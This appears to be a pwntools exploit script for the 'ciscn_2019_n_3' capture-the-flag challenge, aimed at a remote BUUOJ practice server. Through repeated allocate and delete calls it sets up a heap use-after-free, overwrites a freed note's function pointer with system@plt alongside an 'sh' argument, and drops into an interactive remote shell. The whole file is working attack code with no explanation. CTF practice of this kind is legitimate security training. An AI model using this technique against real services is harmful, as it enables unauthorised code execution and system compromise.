from pwn import *

proc_name = './ciscn_2019_n_3'

#p = process(proc_name)
p = remote('node4.buuoj.cn', 28932)
elf = ELF(proc_name)
system = elf.plt['system']

#context.log_level = 'debug'

def alloc(index, t, l, content):
	p.sendlineafter(b'CNote > ', b'1')
	p.sendlineafter(b'Index > ', str(index).encode())
	p.sendlineafter(b'Type > ', str(t).encode())
	if t == 1:
		p.sendlineafter(b'Value > ', str(content).encode())
	else:
		p.sendlineafter(b'Length > ', str(l).encode())
		p.sendlineafter(b'Value > ', content)
	
def delete(index):
	p.sendlineafter(b'CNote > ', b'2')
	p.sendlineafter(b'Index > ', str(index).encode())
	
alloc(1, 2, 0x10, b'/bin/sh\0')
alloc(2, 2, 0x10, b'/bin/sh\0')
delete(1)
delete(2)

alloc(3, 2, 0xc, b'sh\0\0' + p32(system))
#gdb.attach(p, 'b *0x804895a')
delete(1)

p.interactive()
